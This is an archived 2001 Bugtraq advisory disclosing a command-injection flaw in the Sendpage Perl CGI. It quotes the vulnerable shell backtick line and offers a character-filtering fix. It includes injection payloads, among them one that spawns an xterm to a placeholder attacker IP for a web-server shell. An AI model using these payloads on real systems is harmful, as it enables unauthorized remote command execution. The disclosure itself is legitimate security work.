=== Content from marc.info_7badf0e4_20250124_235734.html ===

```
[[prev in list](?l=bugtraq&m=100689373819270&w=2)] [[next in list](?l=bugtraq&m=100695664225256&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=100697823725967&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Sendpage (Perl CGI) Remote Execution Vulnerability](?t=100689314500009&r=1&w=2)
From:       ["Pedram Amini" <pedram.amini () tulane ! edu>](?a=100689318800003&r=1&w=2)
Date:       [2001-11-27 20:15:35](?l=bugtraq&r=1&w=2&b=200111)
[Download RAW [message](?l=bugtraq&m=100689313216624&q=mbox) or [body](?l=bugtraq&m=100689313216624&q=raw)]

* This script is old (1996).
* This script is available at:
<http://honor.sprawl.com/Software/Sendpage/>
* The author of the script was contacted on October 2nd, no response has
been received.
* See Bottom for fix.

Despite the scripts age I've seen it around and administrators should be
aware of this problem. Sendpage.pl basically reads in some input through
standard HTML forms, does some work, and then pipes a string to a user
defined executable which will then send that information as a page (page
as in the telecommunications type) to the intended recipient.

The offending line of code that allows us to execute our own command is
found on line 68.

68: { $ret=`/bin/echo \"$message\" | $pcmd`; }

Examining the script shows that aside from basic URL decoding (lines 30
and 31) no further parsing is done on $message. So what can we do with
this? We can end the echo statement, run our own command, and then start
a new "un-ended" echo statement to satisfy the remainder of the command
line. In Essence:

	test"; OUR COMMAND; echo "message

As an example go to the form page, choose a recipient, and enter the
following as your message:

	test"; touch /tmp/blah; echo "message

Assuming /tmp/blah didn't exist before, it should now. Spawning a shell
with the permissions of the web server is as simple as:

	test"; sh -c 'xterm -display ATACKER_IP:0.0 &'; echo "message

To fix, simply filter out all "dangerous" characters:
,';"/`\%$#{}-&<>... I prefer to keep things simple and remove all
non-alphanumeric characters:

	$message =~ s/[^\w\s]//g;

Pedram Amini
pedram@redhive.com

[[prev in list](?l=bugtraq&m=100689373819270&w=2)] [[next in list](?l=bugtraq&m=100695664225256&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=100697823725967&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


